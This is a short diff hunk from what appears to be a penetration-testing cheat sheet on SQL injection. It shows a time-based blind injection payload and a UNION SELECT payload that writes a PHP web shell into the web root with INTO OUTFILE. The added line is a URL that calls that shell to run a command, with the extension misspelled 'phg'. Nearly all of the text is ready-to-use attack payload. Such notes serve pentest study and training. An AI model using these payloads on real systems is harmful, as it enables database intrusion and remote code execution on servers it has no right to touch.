@@ -27,6 +27,7 @@ offsec' AND IF (1=1, sleep(3),'false') -- //
 ###### From SQL Injection to Code Execution
 ```
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+http://ip/tmp/webshell.phg?cmd=id
 ```
 ### MSSQL Injection
 ###### Summary
